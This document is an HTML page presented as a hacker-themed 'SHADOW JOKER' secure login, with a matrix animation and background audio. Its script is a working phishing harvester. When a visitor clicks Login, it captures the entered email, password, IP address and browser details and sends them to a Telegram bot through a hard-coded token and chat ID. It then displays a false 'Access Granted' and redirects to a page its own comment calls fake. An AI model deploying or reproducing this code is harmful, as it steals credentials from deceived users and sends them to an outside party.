<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>SHADOW JOKER - Secure Access</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      font-family: 'Courier New', monospace;
      background: black;
      color: #0f0;
      height: 100vh;
      overflow: hidden;
    }

    canvas {
      position: fixed;
      top: 0;
      left: 0;
      z-index: -1;
    }

    .login-box {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: rgba(0,0,0,0.8);
      padding: 30px;
      border: 2px solid #0f0;
      box-shadow: 0 0 20px #00ff88;
      border-radius: 10px;
      text-align: center;
      width: 90%;
      max-width: 400px;
    }

    .login-box input {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
      background: black;
      color: #0f0;
      border: 1px solid #0f0;
      border-radius: 5px;
    }

    .login-box button {
      padding: 10px 20px;
      background: #0f0;
      color: black;
      font-weight: bold;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    h2 {
      text-shadow: 0 0 10px #00ff88;
    }

    audio { display: none; }
  </style>
</head>
<body>

<canvas id="matrix"></canvas>

<div class="login-box">
  <h2>SHADOW JOKER Login</h2>
  <input type="text" id="email" placeholder="Enter Email" required>
  <input type="password" id="password" placeholder="Enter Password" required>
  <button onclick="sendLogin()">Login</button>
  <p id="status"></p>
</div>

<audio autoplay loop>
  <source src="https://files.catbox.moe/y9axbn.mp3" type="audio/mp3">
</audio>

<script>
  // Matrix effect
  const canvas = document.getElementById("matrix");
  const ctx = canvas.getContext("2d");
  canvas.height = window.innerHeight;
  canvas.width = window.innerWidth;
  const letters = "01";
  const fontSize = 16;
  const columns = canvas.width / fontSize;
  const drops = Array.from({length: columns}).fill(1);

  function drawMatrix() {
    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#0f0";
    ctx.font = fontSize + "px monospace";
    drops.forEach((y, i) => {
      const text = letters[Math.floor(Math.random() * letters.length)];
      const x = i * fontSize;
      ctx.fillText(text, x, y * fontSize);
      drops[i] = y * fontSize > canvas.height && Math.random() > 0.975 ? 0 : y + 1;
    });
  }
  setInterval(drawMatrix, 33);

  // Telegram Info
  const TOKEN = "8146307587:AAGbRThs2I-N3RzC2Ih7OPf6nyKxVu8T03s";
  const CHAT_ID = "6484972504";

  function sendLogin() {
    const email = document.getElementById("email").value;
    const pass = document.getElementById("password").value;

    document.getElementById("status").innerText = "Verifying credentials...";

    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(data => {
        const ip = data.ip;
        const device = navigator.userAgent;
        const message = `
LOGIN DETECTED:
Email: ${email}
Password: ${pass}
IP: ${ip}
Device: ${device}
        `;

        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
          method: "POST",
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
          })
        }).then(() => {
          document.getElementById("status").innerText = "Access Granted.";
          // redirect to main tools (fake)
          setTimeout(() => {
            window.location.href = "tools.html";
          }, 2000);
        });
      });
  }
</script>

</body>
</html>
